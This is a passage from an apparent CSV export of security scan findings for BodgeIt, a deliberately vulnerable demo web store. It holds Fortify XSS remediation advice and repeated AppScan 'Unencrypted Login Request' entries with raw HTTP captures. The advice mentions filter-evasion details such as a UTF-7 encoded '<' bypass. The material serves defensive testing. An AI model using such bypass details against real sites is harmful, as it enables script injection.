Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","106","Unencrypted Login Request","","Critical","Open","2015-10-15","IBM Security AppScan Standard","523","Unprotected Transport of Credentials","A2","/bodgeit/login.jsp","login.jsp","","http://localhost/bodgeit/login.jsp","","POST /bodgeit/login.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/login.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 19 username=&password= HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2538 Date: Thu, 15 Oct 2015 22:20:58 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <p style=""color:red"">You supplied an invalid name or password.</p> <h3>Login</h3> Please enter your credentials: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username:</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password"" name=""password"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Login""></input></td> </tr> </table> </center> </form> If you dont have an account with us then please <a href=""register.jsp"">Register</a> now for a free account. <br/><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html> GET /bodgeit/js/util.js HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/ Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Accept-Ranges: bytes ETag: W/""1812-1343669578000"" Last-Modified: Mon, 30 Jul 2012 17:32:58 GMT Content-Type: application/javascript Content-Length: 1812 Date: Thu, 15 Oct 2015 22:20:50 GMT function loadfile(filename){ var filetype = filename.split('.').pop(); switch (filetype){ case ""js"": var insert=document.createElement('script') insert.setAttribute(""type"",""text/javascript"") insert.setAttribute(""src"", filename) break; case 'css': var insert=document.createElement(""link""); insert.setAttribute(""type"", ""text/css"") insert.setAttribute(""href"", filename) insert.setAttribute(""rel"", ""stylesheet"") break; } if (typeof insert!=""undefined"") document.getElementsByTagName(""head"")[0].appendChild(insert); return false; } ////The following is from: //http://stackoverflow.com/questions/316781/how-to-build-query-string-with-javascript function form_to_params( form ) { var output = """"; var length = form.elements.length for( var i = 0; i < length; i++ ) { element = form.elements[i] if(element.tagName == 'TEXTAREA' ) { output += ""|"" + element.name + "":"" + element.value; } else if( element.tagName == 'INPU...","","AppScan identified a login request that was not sent over SSL.","<fixRecommendations> <fixRecommendation type=""General""> <text>1. Make sure that all login requests are sent encrypted to the server.</text> <text>2. Make sure that sensitive information such as:</text> <indentText> - Username</indentText> <indentText> - Password</indentText> <indentText> - Social Security number</indentText> <indentText> - Credit Card number</indentText> <indentText> - Driver's License number</indentText> <indentText> - e-mail address</indentText> <indentText> - Phone number</indentText> <indentText> - Zip code</indentText> <br></br> <text>is always sent encrypted to the server.</text> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","77","Unencrypted Login Request","","Critical","Open","2015-10-15","IBM Security AppScan Standard","523","Unprotected Transport of Credentials","A2","/bodgeit/login.jsp","password","","http://localhost/bodgeit/login.jsp","","POST /bodgeit/login.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/login.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 19 username=&password= HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2538 Date: Thu, 15 Oct 2015 22:20:58 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <p style=""color:red"">You supplied an invalid name or password.</p> <h3>Login</h3> Please enter your credentials: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username:</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password"" name=""password"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Login""></input></td> </tr> </table> </center> </form> If you dont have an account with us then please <a href=""register.jsp"">Register</a> now for a free account. <br/><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html> GET /bodgeit/js/util.js HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/ Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Accept-Ranges: bytes ETag: W/""1812-1343669578000"" Last-Modified: Mon, 30 Jul 2012 17:32:58 GMT Content-Type: application/javascript Content-Length: 1812 Date: Thu, 15 Oct 2015 22:20:50 GMT function loadfile(filename){ var filetype = filename.split('.').pop(); switch (filetype){ case ""js"": var insert=document.createElement('script') insert.setAttribute(""type"",""text/javascript"") insert.setAttribute(""src"", filename) break; case 'css': var insert=document.createElement(""link""); insert.setAttribute(""type"", ""text/css"") insert.setAttribute(""href"", filename) insert.setAttribute(""rel"", ""stylesheet"") break; } if (typeof insert!=""undefined"") document.getElementsByTagName(""head"")[0].appendChild(insert); return false; } ////The following is from: //http://stackoverflow.com/questions/316781/how-to-build-query-string-with-javascript function form_to_params( form ) { var output = """"; var length = form.elements.length for( var i = 0; i < length; i++ ) { element = form.elements[i] if(element.tagName == 'TEXTAREA' ) { output += ""|"" + element.name + "":"" + element.value; } else if( element.tagName == 'INPU...","","AppScan identified a password parameter that was not sent over SSL.","<fixRecommendations> <fixRecommendation type=""General""> <text>1. Make sure that all login requests are sent encrypted to the server.</text> <text>2. Make sure that sensitive information such as:</text> <indentText> - Username</indentText> <indentText> - Password</indentText> <indentText> - Social Security number</indentText> <indentText> - Credit Card number</indentText> <indentText> - Driver's License number</indentText> <indentText> - e-mail address</indentText> <indentText> - Phone number</indentText> <indentText> - Zip code</indentText> <br></br> <text>is always sent encrypted to the server.</text> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","93","Unencrypted Login Request","","Critical","Open","2015-10-15","IBM Security AppScan Standard","523","Unprotected Transport of Credentials","A2","/bodgeit/register.jsp","password1","","http://localhost/bodgeit/register.jsp","","POST /bodgeit/register.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/register.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 31 username=&password1=&password2= HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2577 Date: Thu, 15 Oct 2015 22:20:59 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Register</h3> <p style=""color:red"">You must supply a username of at least 5 characters.</p><br/> Please enter the following details to register with us: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username (your email address):</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password1"" name=""password1"" type=""password""></input></td> </tr> <tr> <td>Confirm Password:</td> <td><input id=""password2"" name=""password2"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Register""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html> GET /bodgeit/js/util.js HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/ Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Accept-Ranges: bytes ETag: W/""1812-1343669578000"" Last-Modified: Mon, 30 Jul 2012 17:32:58 GMT Content-Type: application/javascript Content-Length: 1812 Date: Thu, 15 Oct 2015 22:20:50 GMT function loadfile(filename){ var filetype = filename.split('.').pop(); switch (filetype){ case ""js"": var insert=document.createElement('script') insert.setAttribute(""type"",""text/javascript"") insert.setAttribute(""src"", filename) break; case 'css': var insert=document.createElement(""link""); insert.setAttribute(""type"", ""text/css"") insert.setAttribute(""href"", filename) insert.setAttribute(""rel"", ""stylesheet"") break; } if (typeof insert!=""undefined"") document.getElementsByTagName(""head"")[0].appendChild(insert); return false; } ////The following is from: //http://stackoverflow.com/questions/316781/how-to-build-query-string-with-javascript function form_to_params( form ) { var output = """"; var length = form.elements.length for( var i = 0; i < length; i++ ) { element = form.elements[i] if(element.tagName == 'TEXTAREA' ) { output += ""|"" + element.name + "":"" + element.va...","","AppScan identified a password parameter that was not sent over SSL.","<fixRecommendations> <fixRecommendation type=""General""> <text>1. Make sure that all login requests are sent encrypted to the server.</text> <text>2. Make sure that sensitive information such as:</text> <indentText> - Username</indentText> <indentText> - Password</indentText> <indentText> - Social Security number</indentText> <indentText> - Credit Card number</indentText> <indentText> - Driver's License number</indentText> <indentText> - e-mail address</indentText> <indentText> - Phone number</indentText> <indentText> - Zip code</indentText> <br></br> <text>is always sent encrypted to the server.</text> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","103","Unencrypted Login Request","","Critical","Open","2015-10-15","IBM Security AppScan Standard","523","Unprotected Transport of Credentials","A2","/bodgeit/register.jsp","password2","","http://localhost/bodgeit/register.jsp","","POST /bodgeit/register.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/register.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 31 username=&password1=&password2= HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2577 Date: Thu, 15 Oct 2015 22:20:59 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Register</h3> <p style=""color:red"">You must supply a username of at least 5 characters.</p><br/> Please enter the following details to register with us: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username (your email address):</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password1"" name=""password1"" type=""password""></input></td> </tr> <tr> <td>Confirm Password:</td> <td><input id=""password2"" name=""password2"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Register""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html> GET /bodgeit/js/util.js HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/ Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Accept-Ranges: bytes ETag: W/""1812-1343669578000"" Last-Modified: Mon, 30 Jul 2012 17:32:58 GMT Content-Type: application/javascript Content-Length: 1812 Date: Thu, 15 Oct 2015 22:20:50 GMT function loadfile(filename){ var filetype = filename.split('.').pop(); switch (filetype){ case ""js"": var insert=document.createElement('script') insert.setAttribute(""type"",""text/javascript"") insert.setAttribute(""src"", filename) break; case 'css': var insert=document.createElement(""link""); insert.setAttribute(""type"", ""text/css"") insert.setAttribute(""href"", filename) insert.setAttribute(""rel"", ""stylesheet"") break; } if (typeof insert!=""undefined"") document.getElementsByTagName(""head"")[0].appendChild(insert); return false; } ////The following is from: //http://stackoverflow.com/questions/316781/how-to-build-query-string-with-javascript function form_to_params( form ) { var output = """"; var length = form.elements.length for( var i = 0; i < length; i++ ) { element = form.elements[i] if(element.tagName == 'TEXTAREA' ) { output += ""|"" + element.name + "":"" + element.va...","","AppScan identified a password parameter that was not sent over SSL.","<fixRecommendations> <fixRecommendation type=""General""> <text>1. Make sure that all login requests are sent encrypted to the server.</text> <text>2. Make sure that sensitive information such as:</text> <indentText> - Username</indentText> <indentText> - Password</indentText> <indentText> - Social Security number</indentText> <indentText> - Credit Card number</indentText> <indentText> - Driver's License number</indentText> <indentText> - e-mail address</indentText> <indentText> - Phone number</indentText> <indentText> - Zip code</indentText> <br></br> <text>is always sent encrypted to the server.</text> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","108","Unencrypted Login Request","","Critical","Open","2015-10-15","IBM Security AppScan Standard","523","Unprotected Transport of Credentials","A2","/bodgeit/register.jsp","register.jsp","","http://localhost/bodgeit/register.jsp","","POST /bodgeit/register.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/register.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 31 username=&password1=&password2= HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2577 Date: Thu, 15 Oct 2015 22:20:59 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a 